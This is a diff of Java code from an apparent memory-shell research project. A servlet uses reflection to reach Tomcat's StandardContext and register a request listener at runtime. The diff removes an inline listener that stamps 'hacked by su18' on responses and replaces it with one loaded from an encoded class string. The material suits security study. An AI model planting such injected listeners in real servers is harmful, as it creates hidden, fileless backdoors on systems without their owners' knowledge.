@@ -1,18 +1,16 @@
 package org.su18.memshell.test.tomcat;
 
-import org.apache.catalina.connector.Request;
-import org.apache.catalina.connector.RequestFacade;
 import org.apache.catalina.core.StandardContext;
 
 import javax.servlet.ServletContext;
 import javax.servlet.ServletException;
-import javax.servlet.ServletRequestEvent;
-import javax.servlet.ServletRequestListener;
 import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
 import java.lang.reflect.Field;
+
+import static org.su18.memshell.test.tomcat.DynamicUtils.LISTENER_CLASS_STRING;
 
 /**
  * 访问这个 Servlet 将会动态添加自定义 Listener
@@ -45,7 +43,7 @@ public class AddTomcatListener extends HttpServlet {
 			}
 
 			// 添加监听器
-			o.addApplicationEventListener(new TestListener());
+			o.addApplicationEventListener(DynamicUtils.getClass(LISTENER_CLASS_STRING).newInstance());
 
 			resp.getWriter().println("tomcat listener added");
 
@@ -53,40 +51,5 @@ public class AddTomcatListener extends HttpServlet {
 			e.printStackTrace();
 		}
 
-	}
-
-
-	public static class TestListener implements ServletRequestListener {
-
-		/**
-		 * request 结束时进行操作
-		 *
-		 * @param servletRequestEvent ServletRequestEvent
-		 */
-		@Override
-		public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
-			try {
-				RequestFacade request = (RequestFacade) servletRequestEvent.getServletRequest();
-				Field         f       = request.getClass().getDeclaredField("request");
-				f.setAccessible(true);
-				Request req = (Request) f.get(request);
-
-				req.getResponse().getWriter().println("\nhacked by su18");
-
-			} catch (Exception e) {
-				e.printStackTrace();
-			}
-
-
-		}
-
-		/**
-		 * request 初始化时进行操作
-		 *
-		 * @param servletRequestEvent ServletRequestEvent 对象
-		 */
-		@Override
-		public void requestInitialized(ServletRequestEvent servletRequestEvent) {
-		}
 	}
 }
